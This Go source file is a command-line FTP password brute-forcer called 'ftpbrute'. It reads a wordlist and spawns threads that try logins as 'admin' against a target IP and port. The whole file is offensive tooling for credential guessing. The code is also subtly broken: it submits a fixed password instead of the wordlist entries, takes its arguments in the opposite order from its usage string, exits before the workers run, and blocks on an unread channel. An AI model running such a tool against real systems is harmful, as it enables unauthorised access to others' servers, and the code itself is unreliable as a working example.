package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strconv"
	"time"

	"github.com/jlaffaye/ftp"
	"github.com/urfave/cli/v2"
)

func readFile(filename string, words chan<- string) {
	f, _ := os.Open(filename)
	scanner := bufio.NewScanner(f)

	for scanner.Scan() {
		word := scanner.Text()
		words <- word
	}
	close(words)

}

func worker(host string, port int, words <-chan string, tried chan<- string) {
	fullHostname := host + ":" + strconv.Itoa(port)
	c, _ := ftp.Dial(fullHostname, ftp.DialWithTimeout(5*time.Second))

	for word := range words {
		err := c.Login("admin", "anonymous")
		if err == nil {
			fmt.Printf("admin:%s worked!", word)
		}
		tried <- word
	}
	c.Quit()
}

func main() {

	app := &cli.App{
		Name:  "ftpbrute",
		Usage: "ftpbrute <TARGET_IP> <WORDLIST> [-p PORT] [-t THREADS]",
		Flags: []cli.Flag{
			&cli.IntFlag{
				Name:        "port",
				Aliases:     []string{"p"},
				Value:       21,
				Usage:       "Specify FTP port",
				DefaultText: "21",
			},
			&cli.IntFlag{
				Name:        "threads",
				Aliases:     []string{"t"},
				Value:       10,
				Usage:       "Specify number of threads",
				DefaultText: "10",
			},
		},
		Action: func(c *cli.Context) error {
			wordlist := c.Args().Get(0)
			host := c.Args().Get(1)
			port := c.Int("port")
			threads := c.Int("threads")

			words := make(chan string)
			tried := make(chan string)

			go readFile(wordlist, words)

			for i := 0; i < threads; i++ {
				go worker(host, port, words, tried)
			}

			return nil
		},
	}

	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}
